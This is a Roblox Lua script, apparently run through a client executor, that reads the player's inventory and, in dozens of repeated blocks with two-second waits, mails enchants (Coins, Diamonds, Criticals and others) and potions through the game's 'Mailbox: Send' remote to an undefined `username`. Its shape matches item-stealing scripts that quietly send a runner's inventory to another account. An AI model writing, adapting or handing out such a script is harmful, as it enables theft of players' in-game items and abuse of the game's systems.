

local saveModule = require(game:GetService("ReplicatedStorage").Library.Client.Save)
local result = saveModule.Get()

local enchants = result.Inventory.Enchant
for i, v in pairs(enchants) do
    if v.id == "Coins" then
        if v.tn == 1 then
            local args = {
                username,
                "Coins Enchant",
                "Enchant",
                i,
                v._am or 1
            }
            game:GetService("ReplicatedStorage").Network:FindFirstChild("Mailbox: Send"):InvokeServer(unpack(args))
        end
    end
end

task.wait(2)

 

local enchants = result.Inventory.Enchant
for i, v in pairs(enchants) do
    if v.id == "Coins" then
        if v.tn == 2 then
            local args = {
                username,
                "Coins Enchant",
                "Enchant",
                i,
                v._am or 1
            }
            game:GetService("ReplicatedStorage").Network:FindFirstChild("Mailbox: Send"):InvokeServer(unpack(args))
        end
    end
end

task.wait(2)

 

local enchants = result.Inventory.Enchant
for i, v in pairs(enchants) do
    if v.id == "Coins" then
        if v.tn == 3 then
            local args = {
                username,
                "Coins Enchant",
                "Enchant",
                i,
                v._am or 1
            }
            game:GetService("ReplicatedStorage").Network:FindFirstChild("Mailbox: Send"):InvokeServer(unpack(args))
        end
    end
end

task.wait(2)

 

local enchants = result.Inventory.Enchant
for i, v in pairs(enchants) do
    if v.id == "Coins" then
        if v.tn == 4 then
            local args = {
                username,
                "Coins Enchant",
                "Enchant",
                i,
                v._am or 1
            }
            game:GetService("ReplicatedStorage").Network:FindFirstChild("Mailbox: Send"):InvokeServer(unpack(args))
        end
    end
end

task.wait(2)

 

local enchants = result.Inventory.Enchant
for i, v in pairs(enchants) do
    if v.id == "Coins" then
        if v.tn == 5 then
            local args = {
                username,
                "Coins Enchant",
                "Enchant",
                i,
                v._am or 1
            }
            game:GetService("ReplicatedStorage").Network:FindFirstChild("Mailbox: Send"):InvokeServer(unpack(args))
        end
    end
end

task.wait(2)

 

local enchants = result.Inventory.Enchant
for i, v in pairs(enchants) do
    if v.id == "Coins" then
        if v.tn == 6 then
            local args = {
                username,
                "Coins Enchant",
                "Enchant",
                i,
                v._am or 1
            }
            game:GetService("ReplicatedStorage").Network:FindFirstChild("Mailbox: Send"):InvokeServer(unpack(args))
        end
    end
end

task.wait(2)
local enchants = result.Inventory.Enchant
for i, v in pairs(enchants) do
    if v.id == "Strong Pets" then
        if v.tn == 1 then
            local args = {
                username,
                "Strong Pets Enchant",
                "Enchant",
                i,
                v._am or 1
            }
            game:GetService("ReplicatedStorage").Network:FindFirstChild("Mailbox: Send"):InvokeServer(unpack(args))
        end
    end
end

task.wait(2)

 

local enchants = result.Inventory.Enchant
for i, v in pairs(enchants) do
    if v.id == "Strong Pets" then
        if v.tn == 2 then
            local args = {
                username,
                "Strong Pets Enchant",
                "Enchant",
                i,
                v._am or 1
            }
            game:GetService("ReplicatedStorage").Network:FindFirstChild("Mailbox: Send"):InvokeServer(unpack(args))
        end
    end
end

task.wait(2)

 

local enchants = result.Inventory.Enchant
for i, v in pairs(enchants) do
    if v.id == "Strong Pets" then
        if v.tn == 3 then
            local args = {
                username,
                "Strong Pets Enchant",
                "Enchant",
                i,
                v._am or 1
            }
            game:GetService("ReplicatedStorage").Network:FindFirstChild("Mailbox: Send"):InvokeServer(unpack(args))
        end
    end
end

task.wait(2)

 

local enchants = result.Inventory.Enchant
for i, v in pairs(enchants) do
    if v.id == "Strong Pets" then
        if v.tn == 4 then
            local args = {
                username,
                "Strong Pets Enchant",
                "Enchant",
                i,
                v._am or 1
            }
            game:GetService("ReplicatedStorage").Network:FindFirstChild("Mailbox: Send"):InvokeServer(unpack(args))
        end
    end
end

task.wait(2)

 

local enchants = result.Inventory.Enchant
for i, v in pairs(enchants) do
    if v.id == "Strong Pets" then
        if v.tn == 5 then
            local args = {
                username,
                "Strong Pets Enchant",
                "Enchant",
                i,
                v._am or 1
            }
            game:GetService("ReplicatedStorage").Network:FindFirstChild("Mailbox: Send"):InvokeServer(unpack(args))
        end
    end
end

task.wait(2)

 

local enchants = result.Inventory.Enchant
for i, v in pairs(enchants) do
    if v.id == "Strong Pets" then
        if v.tn == 6 then
            local args = {
                username,
                "Strong Pets Enchant",
                "Enchant",
                i,
                v._am or 1
            }
            game:GetService("ReplicatedStorage").Network:FindFirstChild("Mailbox: Send"):InvokeServer(unpack(args))
        end
    end
end

task.wait(2)
local enchants = result.Inventory.Enchant
for i, v in pairs(enchants) do
    if v.id == "Criticals" then
        if v.tn == 1 then
            local args = {
                username,
                "Criticals Enchant",
                "Enchant",
                i,
                v._am or 1
            }
            game:GetService("ReplicatedStorage").Network:FindFirstChild("Mailbox: Send"):InvokeServer(unpack(args))
        end
    end
end

task.wait(2)

 

local enchants = result.Inventory.Enchant
for i, v in pairs(enchants) do
    if v.id == "Criticals" then
        if v.tn == 2 then
            local args = {
                username,
                "Criticals Enchant",
                "Enchant",
                i,
                v._am or 1
            }
            game:GetService("ReplicatedStorage").Network:FindFirstChild("Mailbox: Send"):InvokeServer(unpack(args))
        end
    end
end

task.wait(2)

 

local enchants = result.Inventory.Enchant
for i, v in pairs(enchants) do
    if v.id == "Criticals" then
        if v.tn == 3 then
            local args = {
                username,
                "Criticals Enchant",
                "Enchant",
                i,
                v._am or 1
            }
            game:GetService("ReplicatedStorage").Network:FindFirstChild("Mailbox: Send"):InvokeServer(unpack(args))
        end
    end
end

task.wait(2)

 

local enchants = result.Inventory.Enchant
for i, v in pairs(enchants) do
    if v.id == "Criticals" then
        if v.tn == 4 then
            local args = {
                username,
                "Criticals Enchant",
                "Enchant",
                i,
                v._am or 1
            }
            game:GetService("ReplicatedStorage").Network:FindFirstChild("Mailbox: Send"):InvokeServer(unpack(args))
        end
    end
end

task.wait(2)

 

local enchants = result.Inventory.Enchant
for i, v in pairs(enchants) do
    if v.id == "Criticals" then
        if v.tn == 5 then
            local args = {
                username,
                "Criticals Enchant",
                "Enchant",
                i,
                v._am or 1
            }
            game:GetService("ReplicatedStorage").Network:FindFirstChild("Mailbox: Send"):InvokeServer(unpack(args))
        end
    end
end

task.wait(2)

 

local enchants = result.Inventory.Enchant
for i, v in pairs(enchants) do
    if v.id == "Criticals" then
        if v.tn == 6 then
            local args = {
                username,
                "Criticals Enchant",
                "Enchant",
                i,
                v._am or 1
            }
            game:GetService("ReplicatedStorage").Network:FindFirstChild("Mailbox: Send"):InvokeServer(unpack(args))
        end
    end
end

task.wait(2)
local enchants = result.Inventory.Enchant
for i, v in pairs(enchants) do
    if v.id == "Diamonds" then
        if v.tn == 1 then
            local args = {
                username,
                "Diamonds Enchant",
                "Enchant",
                i,
                v._am or 1
            }
            game:GetService("ReplicatedStorage").Network:FindFirstChild("Mailbox: Send"):InvokeServer(unpack(args))
        end
    end
end

task.wait(2)

 

local enchants = result.Inventory.Enchant
for i, v in pairs(enchants) do
    if v.id == "Diamonds" then
        if v.tn == 2 then
            local args = {
                username,
                "Diamonds Enchant",
                "Enchant",
                i,
                v._am or 1
            }
            game:GetService("ReplicatedStorage").Network:FindFirstChild("Mailbox: Send"):InvokeServer(unpack(args))
        end
    end
end

task.wait(2)

 

local enchants = result.Inventory.Enchant
for i, v in pairs(enchants) do
    if v.id == "Diamonds" then
        if v.tn == 3 then
            local args = {
                username,
                "Diamonds Enchant",
                "Enchant",
                i,
                v._am or 1
            }
            game:GetService("ReplicatedStorage").Network:FindFirstChild("Mailbox: Send"):InvokeServer(unpack(args))
        end
    end
end

task.wait(2)

 

local enchants = result.Inventory.Enchant
for i, v in pairs(enchants) do
    if v.id == "Diamonds" then
        if v.tn == 4 then
            local args = {
                username,
                "Diamonds Enchant",
                "Enchant",
                i,
                v._am or 1
            }
            game:GetService("ReplicatedStorage").Network:FindFirstChild("Mailbox: Send"):InvokeServer(unpack(args))
        end
    end
end

task.wait(2)

 

local enchants = result.Inventory.Enchant
for i, v in pairs(enchants) do
    if v.id == "Diamonds" then
        if v.tn == 5 then
            local args = {
                username,
                "Diamonds Enchant",
                "Enchant",
                i,
                v._am or 1
            }
            game:GetService("ReplicatedStorage").Network:FindFirstChild("Mailbox: Send"):InvokeServer(unpack(args))
        end
    end
end

task.wait(2)

 

local enchants = result.Inventory.Enchant
for i, v in pairs(enchants) do
    if v.id == "Diamonds" then
        if v.tn == 6 then
            local args = {
                username,
                "Diamonds Enchant",
                "Enchant",
                i,
                v._am or 1
            }
            game:GetService("ReplicatedStorage").Network:FindFirstChild("Mailbox: Send"):InvokeServer(unpack(args))
        end
    end
end

task.wait(2)
local enchants = result.Inventory.Enchant
for i, v in pairs(enchants) do
    if v.id == "Tap Power" then
        if v.tn == 1 then
            local args = {
                username,
                "Tap Power Enchant",
                "Enchant",
                i,
                v._am or 1
            }
            game:GetService("ReplicatedStorage").Network:FindFirstChild("Mailbox: Send"):InvokeServer(unpack(args))
        end
    end
end

task.wait(2)

 

local enchants = result.Inventory.Enchant
for i, v in pairs(enchants) do
    if v.id == "Tap Power" then
        if v.tn == 2 then
            local args = {
                username,
                "Tap Power Enchant",
                "Enchant",
                i,
                v._am or 1
            }
            game:GetService("ReplicatedStorage").Network:FindFirstChild("Mailbox: Send"):InvokeServer(unpack(args))
        end
    end
end

task.wait(2)
local enchants = result.Inventory.Enchant
for i, v in pairs(enchants) do
    if v.id == "Tap Power" then
        if v.tn == 3 then
            local args = {
                username,
                "Tap Power Enchant",
                "Enchant",
                i,
                v._am or 1
            }
            game:GetService("ReplicatedStorage").Network:FindFirstChild("Mailbox: Send"):InvokeServer(unpack(args))
        end
    end
end

task.wait(2)

local enchants = result.Inventory.Enchant
for i, v in pairs(enchants) do
    if v.id == "Tap Power" then
        if v.tn == 4 then
            local args = {
                username,
                "Tap Power Enchant",
                "Enchant",
                i,
                v._am or 1
            }
            game:GetService("ReplicatedStorage").Network:FindFirstChild("Mailbox: Send"):InvokeServer(unpack(args))
        end
    end
end

task.wait(2)

 

local enchants = result.Inventory.Enchant
for i, v in pairs(enchants) do
    if v.id == "Tap Power" then
        if v.tn == 5 then
            local args = {
                username,
                "Tap Power Enchant",
                "Enchant",
                i,
                v._am or 1
            }
            game:GetService("ReplicatedStorage").Network:FindFirstChild("Mailbox: Send"):InvokeServer(unpack(args))
        end
    end
end

task.wait(2)

 

local enchants = result.Inventory.Enchant
for i, v in pairs(enchants) do
    if v.id == "Tap Power" then
        if v.tn == 6 then
            local args = {
                username,
                "Tap Power Enchant",
                "Enchant",
                i,
                v._am or 1
            }
            game:GetService("ReplicatedStorage").Network:FindFirstChild("Mailbox: Send"):InvokeServer(unpack(args))
        end
    end
end

task.wait(2)
local enchants = result.Inventory.Enchant
for i, v in pairs(enchants) do
    if v.id == "Lucky Eggs" then
        if v.tn == 1 then
            local args = {
                username,
                "Lucky Eggs Enchant",
                "Enchant",
                i,
                v._am or 1
            }
            game:GetService("ReplicatedStorage").Network:FindFirstChild("Mailbox: Send"):InvokeServer(unpack(args))
        end
    end
end

task.wait(2)

 

local enchants = result.Inventory.Enchant
for i, v in pairs(enchants) do
    if v.id == "Lucky Eggs" then
        if v.tn == 2 then
            local args = {
                username,
                "Lucky Eggs Enchant",
                "Enchant",
                i,
                v._am or 1
            }
            game:GetService("ReplicatedStorage").Network:FindFirstChild("Mailbox: Send"):InvokeServer(unpack(args))
        end
    end
end

task.wait(2)



 

local enchants = result.Inventory.Enchant
for i, v in pairs(enchants) do
    if v.id == "Lucky Eggs" then
        if v.tn == 5 then
            local args = {
                username,
                "Lucky Eggs Enchant",
                "Enchant",
                i,
                v._am or 1
            }
            game:GetService("ReplicatedStorage").Network:FindFirstChild("Mailbox: Send"):InvokeServer(unpack(args))
        end
    end
end

task.wait(2)

 

local enchants = result.Inventory.Enchant
for i, v in pairs(enchants) do
    if v.id == "Lucky Eggs" then
        if v.tn == 6 then
            local args = {
                username,
                "Lucky Eggs Enchant",
                "Enchant",
                i,
                v._am or 1
            }
            game:GetService("ReplicatedStorage").Network:FindFirstChild("Mailbox: Send"):InvokeServer(unpack(args))
        end
    end
end

task.wait(2)
local enchants = result.Inventory.Enchant
for i, v in pairs(enchants) do
    if v.id == "Speed" then
        if v.tn == 1 then
            local args = {
                username,
                "Speed Enchant",
                "Enchant",
                i,
                v._am or 1
            }
            game:GetService("ReplicatedStorage").Network:FindFirstChild("Mailbox: Send"):InvokeServer(unpack(args))
        end
    end
end

task.wait(2)

 

local enchants = result.Inventory.Enchant
for i, v in pairs(enchants) do
    if v.id == "Speed" then
        if v.tn == 2 then
            local args = {
                username,
                "Speed Enchant",
                "Enchant",
                i,
                v._am or 1
            }
            game:GetService("ReplicatedStorage").Network:FindFirstChild("Mailbox: Send"):InvokeServer(unpack(args))
        end
    end
end

task.wait(2)



 

local enchants = result.Inventory.Enchant
for i, v in pairs(enchants) do
    if v.id == "Speed" then
        if v.tn == 5 then
            local args = {
                username,
                "Speed Enchant",
                "Enchant",
                i,
                v._am or 1
            }
            game:GetService("ReplicatedStorage").Network:FindFirstChild("Mailbox: Send"):InvokeServer(unpack(args))
        end
    end
end

task.wait(2)

 

local enchants = result.Inventory.Enchant
for i, v in pairs(enchants) do
    if v.id == "Speed" then
        if v.tn == 6 then
            local args = {
                username,
                "Speed Enchant",
                "Enchant",
                i,
                v._am or 1
            }
            game:GetService("ReplicatedStorage").Network:FindFirstChild("Mailbox: Send"):InvokeServer(unpack(args))
        end
    end
end

task.wait(2)
 

local enchants = result.Inventory.Enchant
for i, v in pairs(enchants) do
    if v.id == "Magnet" then
        if v.tn == 3 then
            local args = {
                username,
                "Magnet Enchant",
                "Enchant",
                i,
                v._am or 1
            }
            game:GetService("ReplicatedStorage").Network:FindFirstChild("Mailbox: Send"):InvokeServer(unpack(args))
        end
    end
end

task.wait(2)
 

local potions = result.Inventory.Potion
for i, v in pairs(potions) do
    if v.id == "Coins" then
        if v.tn == 1 then
            local args = {
                username,
                "Coins Potion",
                "Potion",
                i,
                v._am or 1
            }
            game:GetService("ReplicatedStorage").Network:FindFirstChild("Mailbox: Send"):InvokeServer(unpack(args))
        end
    end
end

task.wait(2)

 

local potions = result.Inventory.Potion
for i, v in pairs(potions) do
    if v.id == "Coins" then
        if v.tn == 2 then
            local args = {
                username,
                "Coins Potion",
                "Potion",
                i,
                v._am or 1
            }
            game:GetService("ReplicatedStorage").Network:FindFirstChild("Mailbox: Send"):InvokeServer(unpack(args))
        end
    end
end

task.wait(2)

 

local potions = result.Inventory.Potion
for i, v in pairs(potions) do
    if v.id == "Coins" then
        if v.tn == 3 then
            local args = {
                username,
                "Coins Potion",
                "Potion",
                i,
                v._am or 1
            }
            game:GetService("ReplicatedStorage").Network:FindFirstChild("Mailbox: Send"):InvokeServer(unpack(args))
        end
    end
end

task.wait(2)

 

local potions = result.Inventory.Potion
for i, v in pairs(potions) do
    if v.id == "Coins" then
        if v.tn == 4 then
            local args = {
                username,
                "Coins Potion",
                "Potion",
                i,
                v._am or 1
            }
            game:GetService("ReplicatedStorage").Network:FindFirstChild("Mailbox: Send"):InvokeServer(unpack(args))
        end
    end
end

task.wait(2)

 

local potions = result.Inventory.Potion
for i, v in pairs(potions) do
    if v.id == "Coins" then
        if v.tn == 5 then
            local args = {
                username,
                "Coins Potion",
                "Potion",
                i,
                v._am or 1
            }
            game:GetService("ReplicatedStorage").Network:FindFirstChild("Mailbox: Send"):InvokeServer(unpack(args))
        end
    end
end

task.wait(2)

 

local potions = result.Inventory.Potion
for i, v in pairs(potions) do
    if v.id == "Coins" then
        if v.tn == 6 then
            local args = {
                username,
                "Coins Potion",
                "Potion",
                i,
                v._am or 1
            }
            game:GetService("ReplicatedStorage").Network:FindFirstChild("Mailbox: Send"):InvokeServer(unpack(args))
        end
    end
end

task.wait(2)
 

local potions = result.Inventory.Potion
for i, v in pairs(potions) do
    if v.id == "Damage" then
        if v.tn == 1 then
            local args = {
                username,
                "Damage Potion",
                "Potion",
                i,
                v._am or 1
            }
            game:GetService("ReplicatedStorage").Network:FindFirstChild("Mailbox: Send"):InvokeServer(unpack(args))
        end
    end
end

task.wait(2)

 

local potions = result.Inventory.Potion
for i, v in pairs(potions) do
    if v.id == "Damage" then
        if v.tn == 2 then
            local args = {
                username,
                "Damage Potion",
                "Potion",
                i,
                v._am or 1
            }
            game:GetService("ReplicatedStorage").Network:FindFirstChild("Mailbox: Send"):InvokeServer(unpack(args))
        end
    end
end

task.wait(2)

 

local potions = result.Inventory.Potion
for i, v in pairs(potions) do
    if v.id == "Damage" then
        if v.tn == 3 then
            local args = {
                username,
                "Damage Potion",
                "Potion",
                i,
                v._am or 1
            }
            game:GetService("ReplicatedStorage").Network:FindFirstChild("Mailbox: Send"):InvokeServer(unpack(args))
        end
    end
end

task.wait(2)

 

local potions = result.Inventory.Potion
for i, v in pairs(potions) do
    if v.id == "Damage" then
        if v.tn == 4 then
            local args = {
                username,
                "Damage Potion",
                "Potion",
                i,
                v._am or 1
            }
            game:GetService("ReplicatedStorage").Network:FindFirstChild("Mailbox: Send"):InvokeServer(unpack(args))
        end
    end
end

task.wait(2)

 

local potions = result.Inventory.Potion
for i, v in pairs(potions) do
    if v.id == "Damage" then
        if v.tn == 5 then
            local args = {
                username,
                "Damage Potion",
                "Potion",
                i,
                v._am or 1
            }
            game:GetService("ReplicatedStorage").Network:FindFirstChild("Mailbox: Send"):InvokeServer(unpack(args))
        end
    end
end

task.wait(2)

 

local potions = result.Inventory.Potion
for i, v in pairs(potions) do
    if v.id == "Damage" then
        if v.tn == 6 then
            local args = {
                username,
                "Damage Potion",
                "Potion",
                i,
                v._am or 1
            }
            game:GetService("ReplicatedStorage").Network:FindFirstChild("Mailbox: Send"):InvokeServer(unpack(args))
        end
    end
end

task.wait(2)
 

local potions = result.Inventory.Potion
for i, v in pairs(potions) do
    if v.id == "Lucky Eggs" then
        if v.tn == 1 then
            local args = {
                username,
                "Lucky Eggs Potion",
                "Potion",
                i,
                v._am or 1
            }
            game:GetService("ReplicatedStorage").Network:FindFirstChild("Mailbox: Send"):InvokeServer(unpack(args))
        end
    end
end

task.wait(2)

 

local potions = result.Inventory.Potion
for i, v in pairs(potions) do
    if v.id == "Lucky Eggs" then
        if v.tn == 2 then
            local args = {
                username,
                "Lucky Eggs Potion",
                "Potion",
                i,
                v._am or 1
            }
            game:GetService("ReplicatedStorage").Network:FindFirstChild("Mailbox: Send"):InvokeServer(unpack(args))
        end
    end
end

task.wait(2)

 

local potions = result.Inventory.Potion
for i, v in pairs(potions) do
    if v.id == "Lucky Eggs" then
        if v.tn == 3 then
            local args = {
                username,
                "Lucky Eggs Potion",
                "Potion",
                i,
                v._am or 1
            }
            game:GetService("ReplicatedStorage").Network:FindFirstChild("Mailbox: Send"):InvokeServer(unpack(args))
        end
    end
end

task.wait(2)

 

local potions = result.Inventory.Potion
for i, v in pairs(potions) do
    if v.id == "Lucky Eggs" then
        if v.tn == 4 then
            local args = {
                username,
                "Lucky Eggs Potion",
                "Potion",
                i,
                v._am or 1
            }
            game:GetService("ReplicatedStorage").Network:FindFirstChild("Mailbox: Send"):InvokeServer(unpack(args))
        end
    end
end

task.wait(2)

 

local potions = result.Inventory.Potion
for i, v in pairs(potions) do
    if v.id == "Lucky Eggs" then
        if v.tn == 5 then
            local args = {
                username,
                "Lucky Eggs Potion",
                "Potion",
                i,
                v._am or 1
            }
            game:GetService("ReplicatedStorage").Network:FindFirstChild("Mailbox: Send"):InvokeServer(unpack(args))
        end
    end
end

task.wait(2)

 

local potions = result.Inventory.Potion
for i, v in pairs(potions) do
    if v.id == "Lucky Eggs" then
        if v.tn == 6 then
            local args = {
                username,
                "Lucky Eggs Potion",
                "Potion",
                i,
                v._am or 1
            }
            game:GetService("ReplicatedStorage").Network:FindFirstChild("Mailbox: Send"):InvokeServer(unpack(args))
        end
    end
end

task.wait(2)
 

local potions = result.Inventory.Potion
for i, v in pairs(potions) do
    if v.id == "Treasure Hunter" then
        if v.tn == 1 then
            local args = {
                username,
                "Treasure Hunter Potion",
                "Potion",
                i,
                v._am or 1
            }
            game:GetService("ReplicatedStorage").Network:FindFirstChild("Mailbox: Send"):InvokeServer(unpack(args))
        end
    end
end

task.wait(2)

 

local potions = result.Inventory.Potion
for i, v in pairs(potions) do
    if v.id == "Treasure Hunter" then
        if v.tn == 2 then
            local args = {
                username,
                "Treasure Hunter Potion",
                "Potion",
                i,
                v._am or 1
            }
            game:GetService("ReplicatedStorage").Network:FindFirstChild("Mailbox: Send"):InvokeServer(unpack(args))
        end
    end
end

task.wait(2)

 

local potions = result.Inventory.Potion
for i, v in pairs(potions) do
    if v.id == "Treasure Hunter" then
        if v.tn == 3 then
            local args = {
                username,
                "Treasure Hunter Potion",
                "Potion",
                i,
                v._am or 1
            }
            game:GetService("ReplicatedStorage").Network:FindFirstChild("Mailbox: Send"):InvokeServer(unpack(args))
        end
    end
end

task.wait(2)

 

local potions = result.Inventory.Potion
for i, v in pairs(potions) do
    if v.id == "Treasure Hunter" then
        if v.tn == 4 then
            local args = {
                username,
                "Treasure Hunter Potion",
                "Potion",
                i,
                v._am or 1
            }
            game:GetService("ReplicatedStorage").Network:FindFirstChild("Mailbox: Send"):InvokeServer(unpack(args))
        end
    end
end

task.wait(2)

 

local potions = result.Inventory.Potion
for i, v in pairs(potions) do
    if v.id == "Treasure Hunter" then
        if v.tn == 5 then
            local args = {
                username,
                "Treasure Hunter Potion",
                "Potion",
                i,
                v._am or 1
            }
            game:GetService("ReplicatedStorage").Network:FindFirstChild("Mailbox: Send"):InvokeServer(unpack(args))
        end
    end
end

task.wait(2)

 

local potions = result.Inventory.Potion
for i, v in pairs(potions) do
    if v.id == "Treasure Hunter" then
        if v.tn == 6 then
            local args = {
                username,
                "Treasure Hunter Potion",
                "Potion",
                i,
                v._am or 1
            }
            game:GetService("ReplicatedStorage").Network:FindFirstChild("Mailbox: Send"):InvokeServer(unpack(args))
        end
    end
end

task.wait(2)
 

local potions = result.Inventory.Potion
for i, v in pairs(potions) do
    if v.id == "Diamonds" then
        if v.tn == 1 then
            local args = {
                username,
                "Diamonds Potion",
                "Potion",
                i,
                v._am or 1
            }
            game:GetService("ReplicatedStorage").Network:FindFirstChild("Mailbox: Send"):InvokeServer(unpack(args))
        end
    end
end

task.wait(2)

 

local potions = result.Inventory.Potion
for i, v in pairs(potions) do
    if v.id == "Diamonds" then
        if v.tn == 2 then
            local args = {
                username,
                "Diamonds Potion",
                "Potion",
                i,
                v._am or 1
            }
            game:GetService("ReplicatedStorage").Network:FindFirstChild("Mailbox: Send"):InvokeServer(unpack(args))
        end
    end
end

task.wait(2)

 

local potions = result.Inventory.Potion
for i, v in pairs(potions) do
    if v.id == "Diamonds" then
        if v.tn == 3 then
            local args = {
                username,
                "Diamonds Potion",
                "Potion",
                i,
                v._am or 1
            }
            game:GetService("ReplicatedStorage").Network:FindFirstChild("Mailbox: Send"):InvokeServer(unpack(args))
        end
    end
end

task.wait(2)

 

local potions = result.Inventory.Potion
for i, v in pairs(potions) do
    if v.id == "Diamonds" then
        if v.tn == 4 then
            local args = {
                username,
                "Diamonds Potion",
                "Potion",
                i,
                v._am or 1
            }
            game:GetService("ReplicatedStorage").Network:FindFirstChild("Mailbox: Send"):InvokeServer(unpack(args))
        end
    end
end

task.wait(2)

 

local potions = result.Inventory.Potion
for i, v in pairs(potions) do
    if v.id == "Diamonds" then
        if v.tn == 5 then
            local args = {
                username,
                "Diamonds Potion",
                "Potion",
                i,
                v._am or 1
            }
            game:GetService("ReplicatedStorage").Network:FindFirstChild("Mailbox: Send"):InvokeServer(unpack(args))
        end
    end
end

task.wait(2)

 

local potions = result.Inventory.Potion
for i, v in pairs(potions) do
    if v.id == "Diamonds" then
        if v.tn == 6 then
            local args = {
                username,
                "Diamonds Potion",
                "Potion",
                i,
                v._am or 1
            }
            game:GetService("ReplicatedStorage").Network:FindFirstChild("Mailbox: Send"):InvokeServer(unpack(args))
        end
    end
end

task.wait(2)
 

local potions = result.Inventory.Potion
for i, v in pairs(potions) do
    if v.id == "Speed" then
        if v.tn == 1 then
            local args = {
                username,
                "Speed Potion",
                "Potion",
                i,
                v._am or 1
            }
            game:GetService("ReplicatedStorage").Network:FindFirstChild("Mailbox: Send"):InvokeServer(unpack(args))
        end
    end
end

task.wait(2)

 

local potions = result.Inventory.Potion
for i, v in pairs(potions) do
    if v.id == "Speed" then
        if v.tn == 2 then
            local args = {
                username,
                "Speed Potion",
                "Potion",
                i,
                v._am or 1
            }
            game:GetService("ReplicatedStorage").Network:FindFirstChild("Mailbox: Send"):InvokeServer(unpack(args))
        end
    end
end

task.wait(2)

 

local potions = result.Inventory.Potion
for i, v in pairs(potions) do
    if v.id == "Speed" then
        if v.tn == 3 then
            local args = {
                username,
                "Speed Potion",
                "Potion",
                i,
                v._am or 1
            }
            game:GetService("ReplicatedStorage").Network:FindFirstChild("Mailbox: Send"):InvokeServer(unpack(args))
        end
    end
end

task.wait(2)

 

